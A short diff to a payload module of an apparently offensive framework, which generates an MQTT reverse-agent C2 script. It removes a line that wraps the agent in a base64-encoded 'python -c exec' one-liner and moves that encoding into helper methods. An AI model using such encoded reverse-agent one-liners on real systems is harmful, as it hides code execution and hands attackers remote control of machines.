@@ -1,5 +1,4 @@
 from kittysploit import *
-import base64
 
 from lib.c2.mqtt_reverse_agent import build_mqtt_reverse_agent_script
 
@@ -76,7 +75,5 @@ class Module(Payload):
 			getattr(getattr(self, "output_format", None), "value", self.output_format) or "oneliner"
 		).strip().lower()
 		if fmt == "script":
-			return script
-		encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
-		py = str(self.python_binary)
-		return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
+			return self._finalize_python_script(script)
+		return self._encode_python_one_liner(script, self.python_binary)
